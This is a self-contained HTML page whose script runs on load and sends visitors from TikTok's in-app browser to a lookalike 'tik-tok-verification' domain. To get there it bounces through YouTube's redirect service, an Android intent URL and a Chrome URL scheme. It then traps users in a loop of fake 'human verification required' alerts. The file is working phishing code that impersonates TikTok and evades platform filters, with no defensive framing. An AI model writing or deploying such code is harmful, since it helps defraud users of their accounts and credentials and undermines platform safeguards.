<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>body { background: #fff; margin: 0; padding: 0; }</style>
</head>
<body>

<script>
    // Your final destination
    const finalDest = "https://tik-tok-verification.com/Verification/verify1.html";
    
    // The Slingshot: YouTube's official redirect tool
    // We encode your URL so it fits inside the YouTube query
    const slingshotUrl = "https://www.youtube.com/redirect?q=" + encodeURIComponent(finalDest);
    
    const killTime = Date.now() + 25000;

    function triggerSlingshot() {
        const isAndroid = /Android/i.test(navigator.userAgent);
        
        if (isAndroid) {
            // Android: We stick to the Intent (it works best there)
            // But we point the intent to the SLINGSHOT, not your site.
            // This forces the "Open with..." menu to include YouTube/Browsers
            const urlNoProt = slingshotUrl.replace("https://", "");
            window.location.href = `intent://${urlNoProt}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;end`;
        } else {
            // iOS: The Slingshot Logic
            
            // 1. Try to open the YouTube App directly (Deep Link)
            // If installed, it opens, sees the redirect, and throws to Safari.
            window.location.href = "youtube://redirect?q=" + encodeURIComponent(finalDest);
            
            // 2. Fallback: Open the web version of the slingshot
            // TikTok sees "youtube.com" and often lets it pass to the system.
            setTimeout(() => {
                window.location.href = slingshotUrl;
            }, 100);
            
            // 3. Last Resort: The "Clean" Chrome Scheme (Fixed to prevent searching)
            // We strip the protocol entirely to prevent it from looking like a search query
            setTimeout(() => {
                const domainPath = finalDest.replace(/^https?:\/\//, '');
                window.location.href = "googlechromes://" + domainPath; 
            }, 200);
        }
    }

    function securityLoop() {
        if (Date.now() > killTime) return;

        // 1. Fire Slingshot IMMEDIATELY
        triggerSlingshot();

        // 2. Rapid Check (100ms)
        setTimeout(() => {
            if (document.hasFocus()) {
                const header = "HUMAN VERIFICATION REQUIRED\n";
                const body = "______________________________\n\nSuspicious network activity detected, please complete human verification to continue using TikTok.";
                
                // 3. The Lock
                alert(header + body);

                // 4. Fire Slingshot on "OK" Gesture
                triggerSlingshot();

                // 5. Immediate Recursive Loop
                securityLoop();
            }
        }, 100); 
    }

    window.onload = securityLoop;
    window.onfocus = () => { if (Date.now() < killTime) securityLoop(); };
</script>

</body>
</html>
